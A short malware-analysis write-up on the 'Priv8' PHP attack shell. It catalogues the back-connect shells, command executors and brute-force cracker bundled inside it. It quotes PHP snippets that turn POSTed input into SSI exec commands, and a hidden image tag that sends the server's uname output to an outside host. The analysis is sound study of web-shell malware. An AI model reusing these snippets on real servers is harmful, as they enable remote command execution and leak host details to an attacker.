# Code Carried Internally by Priv8 Attack Shell

This is just a mutated version of "webroot" hacking package.
The weird style of carrying entire programs in base64, gzipped strings,
writing them out and executing is common to both.
Many of the programs so executed are common to both "webroot"
and this package, or are very similar.

* `Ph33r/Ph33r.php` - PHP, simple cURL based proxy.
* `cgirun/cgi.pr` - Perl, remote command execution
* `cgitelnet1/dc.pl`, Perl, "Data Cha0s Connect Back Backdoor", back shell to port 80 on arbitrary host.
* `cgitelnet1/izo.cin`, Perl, same as `web.root` from [kinked activex theme](../themes/activex)
* `configler/config.izo`, Perl, same as `config.root`  from [kinked activex theme](../themes/activex)
* `litespeed/ssi.php` - PHP, same as `litebypass.php` from the kinked activex theme.
* `perltools/perlbypass.php`, PHP, but incorrect syntax. Too goofed up to figure out.
* `python/python.izo`, Python, "A simple CGI that executes arbitrary shell commands." Dated 07-07-04
* `safeof/safe.php`, PHP, "Command shell", gaudy PHP exec of two POST parameters
* `ssim/pss_v.1.0_min.shtml`, looks like a little recon via pre-processed HTML.
Contains things like `<!--#exec cmd="whoami"-->`.
* `conp` - Python, simple back shell, configurable host and port that it
connects back to.
* `dayi` - Perl, "simple back connect", somewhat similar to `cgitelnet1/dc.pl`
* `ftpcrack.php` - PHP, "Cpanel , FTP CraCkeR", brute force (totally random passwords generated) Cpanel and FTP guesser.
I'd be surprised if this ever found a password.
* `priv9` - Python, another back shell, different from `conp`.

## `litespeed/ssi.php`

This is a mutated version of [litebypass.php](../themes/activex/webrot/litebypass.php), another Webrootv3 file.
`ssi.php` from this package has a section like this:

    <?php
    $command = $_POST['command'];
    $z00z = $_POST['z00z'];
    if($command){
    $z11d = "<center><pre><pre>
    <br>
    Redsecurity.iblogger.org
    <br>
    <br>
    <!--#exec cmd='$command' --> 
    
    ";
    $openfile = fopen("izo.shtml","w");
    $writeinto = fwrite($openfile,"$z11d");
    fclose($openfile);
    if($openfile){
    }else{
    }
    }

`litebypass.php` from [kinked activex theme](../../themes/activex) hs an almost identical section:

    <?php
    $command = $_POST['command'];
    $l00l = $_POST['l00l'];
    if($command){
    $z11d = "<center><pre><pre>
    <br>
    <!--#exec cmd='$command' --> 
    
    ";
    $openfile = fopen("web.shtml","w");
    $writeinto = fwrite($openfile,"$z11d");
    fclose($openfile);
    if($openfile){
    }else{
    }
    }

It has the same 0x0 "img" web bug that the main PHP file, `izocin.php` had:

    <img border="0" src="http://priv8.iblogger.org/s.php?'+<?echo "uname -a : "; echo (php_uname())?>";" width="0" height="0">
